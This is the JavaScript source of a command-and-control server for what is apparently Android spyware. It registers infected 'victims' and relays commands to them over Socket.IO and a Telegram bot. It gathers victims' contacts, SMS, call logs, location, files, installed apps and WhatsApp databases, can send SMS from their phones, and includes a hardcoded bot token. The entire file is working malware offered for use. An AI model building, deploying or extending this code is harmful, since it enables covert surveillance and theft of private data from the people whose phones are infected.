const express = require('express');  
const app = express();  
const server = require('http').createServer(app);  
const { Server } = require('socket.io');  
const TelegramBot = require('node-telegram-bot-api');

const io = new Server(server, {  
    maxHttpBufferSize: 1e8, // 100MB  
});  

  
const TELEGRAM_BOT_TOKEN = '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';  
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
let adminChatId = '';

var victimList = {};  
var deviceList = {};  
var victimData = {};  
var adminSocketId = null;  
const port = 8080;  

server.listen(process.env.PORT || port, (err) => {  
    if (err) return;  
    log("Server Started on port: " + port);  
});  

app.get('/', (req, res) => res.send('Server Runnnnning!!'));

io.on('connection', (socket) => {  
    socket.on('adminJoin', () => {  
        adminSocketId = socket.id;  
        if (Object.keys(victimData).length > 0) {  
            Object.keys(victimData).forEach((key) => socket.emit("join", victimData[key]));  
        }  
    });

    socket.on('request', request);

    socket.on('join', (device) => {  
        log("Victim joined => socketId " + JSON.stringify(socket.id));  
        victimList[device.id] = socket.id;  
        victimData[device.id] = { ...device, socketId: socket.id };  
        deviceList[socket.id] = {  
            "id": device.id,  
            "model": device.model  
        };  
        socket.broadcast.emit("join", { ...device, socketId: socket.id });  

          
        if (adminChatId) {  
            bot.sendMessage(adminChatId, `📲 New Device Connected\n\nID: ${device.id}\nModel: ${device.model}\nSocket ID: ${socket.id}`);
        }  
    });    
    socket.on('getDir', (data) => response("getDir", data));  
    socket.on('getInstalledApps', (data) => response("getInstalledApps", data));  
    socket.on('getContacts', (data) => response("getContacts", data));  
    socket.on('sendSMS', (data) => response("sendSMS", data));  
    socket.on('getCallLog', (data) => response("getCallLog", data));  
    socket.on("previewImage", (data) => response("previewImage", data));  
    socket.on("error", (data) => response("error", data));  
    socket.on("getSMS", (data) => response("getSMS", data));  
    socket.on('getLocation', (data) => response("getLocation", data));  

    // Handle disconnection  
    socket.on('disconnect', () => {  
        if (socket.id === adminSocketId) {  
            adminSocketId = null;  
        } else {  
            response("disconnectClient", socket.id);  
            Object.keys(victimList).forEach((key) => {  
                if (victimList[key] === socket.id) {  
                    delete victimList[key];  
                    delete victimData[key];  
                }  
            });  
        }  
    });  

    socket.on("download", (d, callback) => responseBinary("download", d, callback));  
    socket.on("downloadWhatsappDatabase", (d, callback) => {  
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);  
    });  
});  

// Handle Telegram Commands  
bot.onText(/\/start/, (msg) => {  
    adminChatId = msg.chat.id;  
    bot.sendMessage(adminChatId, "✅ Bot Connected! You will receive updates here.");  
});  

bot.onText(/\/victims/, (msg) => {  
    if (Object.keys(victimData).length === 0) {  
        bot.sendMessage(adminChatId, "No victims connected.");  
    } else {  
        let victimsList = Object.values(victimData).map(v => `📲 ID: ${v.id} | Model: ${v.model}`).join("\n");  
        bot.sendMessage(adminChatId, `🔗 Active Victims:\n\n${victimsList}`);  
    }  
});  

bot.onText(/\/send (.+)/, (msg, match) => {  
    let command = match[1].split(" ");  
    let victimId = command[0];  
    let action = command[1];  
    let data = command.slice(2).join(" ");  

    if (victimList[victimId]) {  
        io.to(victimList[victimId]).emit(action, data);  
        bot.sendMessage(adminChatId, `✅ Sent command to ${victimId}\nAction: ${action}\nData: ${data}`);  
    } else {  
        bot.sendMessage(adminChatId, "❌ Victim not found.");  
    }  
});  

const request = (d) => {  
    let { to, action, data } = JSON.parse(d);  
    log("Requesting action: " + action);  
    io.to(victimList[to]).emit(action, data);  
};  

const response = (action, data) => {  
    if (adminSocketId) {  
        log("Response action: " + action);  
        io.to(adminSocketId).emit(action, data);  
    }  
    // Send response to Telegram bot  
    if (adminChatId) {  
        bot.sendMessage(adminChatId, `📡 Response Received:\n\nAction: ${action}\nData: ${JSON.stringify(data, null, 2)}`);  
    }  
};  

const responseBinary = (action, data, callback) => {  
    if (adminSocketId) {  
        log("Response action: " + action);  
        callback("success");  
        io.to(adminSocketId).emit(action, data);  
    }  
};  

// LOGGER  
const log = (message) => {  
    console.log(message);  
};
